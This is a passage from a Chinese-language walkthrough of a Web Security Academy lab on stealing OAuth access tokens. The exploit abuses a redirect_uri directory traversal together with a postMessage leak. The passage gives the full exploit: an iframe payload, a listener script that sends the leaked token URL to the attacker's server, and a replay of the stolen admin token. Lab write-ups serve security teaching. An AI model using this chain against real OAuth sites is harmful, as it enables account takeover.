  2. 重放第一个Request，并修改redirect_uri，确认参数确实存在目录遍历攻击
    GET /auth?client_id=cefvv41oq0lwkcnh9d5ym&redirect_uri=https://0a89006d035badd680d0268d006900e0.web-security-academy.net/oauth-callback../&response_type=token&nonce=1926909250&scope=openid%20profile%20email HTTP/2

    HTTP/2 302 Found

Redirecting to <a href="/interaction/D_c8k2xC9RZiz4ofxVH4d">/interaction/D_c8k2xC9RZiz4ofxVH4d</a>.
  3. 回到主页，随机点选一篇文章的View post，可看到有下列Request，从Javascript代码使用postMessage()方法将window.location.href属性发送到其父窗口，通过此特性将redirect_url和/post/comment/comment-form请求结合使用
    GET /post/comment/comment-form HTTP/2
Host: 0a89006d035badd680d0268d006900e0.web-security-academy.net

    HTTP/2 200 OK

<script>
    parent.postMessage({type: 'onload', data: window.location.href}, '*')
    function submitForm(form, ev) {
        ev.preventDefault();
        const formData = new FormData(document.getElementById("comment-form"));
        const hashParams = new URLSearchParams(window.location.hash.substr(1));
        const o = {};
        formData.forEach((v, k) => o[k] = v);
        hashParams.forEach((v, k) => o[k] = v);
        parent.postMessage({type: 'oncomment', content: o}, '*');
        form.reset();
    }
</script>
  4. 点击最上方Go to exploit server，并在Body构造<iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>，并在其下方新增javascript
    <script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>
  5. 点击最下方的Store、Deliver expolit to victim后点击Access log
  6. 重放步骤1的第二个Request，并将Authorization: Bearer参数更换为Admin的access_token
